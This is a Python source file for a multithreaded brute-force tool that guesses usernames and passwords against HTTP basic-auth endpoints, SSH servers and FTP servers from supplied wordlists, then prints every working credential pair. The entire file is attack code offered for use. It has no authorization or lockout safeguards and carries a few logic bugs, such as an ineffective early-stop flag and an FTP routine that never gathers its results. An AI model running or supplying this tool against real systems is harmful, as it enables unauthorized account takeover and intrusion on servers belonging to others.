import requests
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore
import logging
import paramiko
import ftplib


class Bruteforce:
    def __init__(self, host: str, usernames: list, passwords: list) -> None:
        self.host = host
        self.usernames = usernames
        self.passwords = passwords
        self.positive = {}
        self.found = False
    

    def _checkAlive(self) -> bool:
        """ Check if the host exist/is alive with socket for domains
            and with requests for urls """

        host = self.host

        try:
            if host.startswith("https://") or host.startswith("http://"):
                requests.get(host)
                return True
            
            else:
                s = socket.gethostbyname(host)
                return True

        except (requests.RequestException, socket.gaierror):
            return False


    def _checkUrl(self) -> bool:
        """ Check if the url is valid checking the protocol (http:// or https://) """

        url = self.host

        if url.startswith("https://") == False and url.startswith("http://") == False:
            return False
    
        return True
    

    def _httpAuth(self, username, password, Session) -> bool:
        """ Send a single request for authentitating, use a session to be faster
            
            use with threading to be more faster """

        try:
            req = Session.post(self.host, auth=(username, password))

            if req.status_code == 200:
                self.positive.update({username: password})
                print(password + " -> " + str(req.status_code))
        
        except requests.RequestException as e:
            logging.error(f"Request failed for {username}:{password} - {e}")


    def http(self, threads: int = 16, printSuccess: bool = False) -> dict:
        """ Starh the http bruteforce process """

        watched = []
        futures = []
        Session = requests.Session()

        if self._checkAlive() == False:
            return False
        
        if self._checkUrl() == False:
            return False

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for user in self.usernames:
                for password in self.passwords:    
                    futures.append(executor.submit(self._httpAuth, user, password, Session))

                    if self.found == True:
                        self.found = False

                        break
                    
        
            for future in as_completed(futures):
                future.result()
        
        if printSuccess == True and self.positive:

            for i in self.positive:
                if i not in watched:
                    print(Fore.LIGHTGREEN_EX + "[" + Fore.RESET + "+" + Fore.LIGHTGREEN_EX + "] " + i + ":" + self.positive[i] + Fore.RESET)
                    watched += i
                
        return self.positive


    def _sshAuth(self, username: str, password: str, port: int) -> None:
        """ Try a single ssh login """

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(self.host, port=port, username=username, password=password, timeout=3)
            self.positive.update({username: password})
            self.found = True

        except paramiko.AuthenticationException:
            pass

        except ConnectionResetError:
            pass

        except Exception as e:
            logging.error(f"Error connecting to {self.host}:{port} - {e}")
        


    def ssh(self, threads: int = 16, printSuccess: bool = False, port: int = 22) -> dict:
        """ Start the ssh bruteforce process """

        futures = []

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for username in self.usernames:
                for password in self.passwords:
                    futures.append(executor.submit(self._sshAuth, username, password, port))

                    if self.found == True:
                        self.found = False

                        break


        for future in as_completed(futures):
                future.result()

        if printSuccess and self.positive:
            for user, password in self.positive.items():
                print(Fore.LIGHTGREEN_EX + "[" + Fore.RESET + "+" + Fore.LIGHTGREEN_EX + "] " + user + ":" + password + Fore.RESET)
        
        return self.positive

    
    def _ftpAuth(self, username, password) -> None:
        """ Try a single ftp login """

        try:
            ftplib.FTP(self.host, username, password)
            self.found = True
            self.positive.update({username: password})
        
        except (ftplib.error_perm, ftplib.error_temp):
            pass
    
        except Exception as e:
            logging.error(e)


    def ftp(self, threads: int = 16, printSuccess: bool = False) -> dict:
        """ Start the ftp bruteforce process """

        futures = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for username in self.usernames:
                for password in self.passwords:
                    executor.submit(self._ftpAuth, username, password)

                    if self.found == True:
                            self.found = False

                            break


        for future in as_completed(futures):
                future.result()

        if printSuccess and self.positive:
            for user, password in self.positive.items():
                print(Fore.LIGHTGREEN_EX + "[" + Fore.RESET + "+" + Fore.LIGHTGREEN_EX + "] " + user + ":" + password + Fore.RESET) 

        return self.positive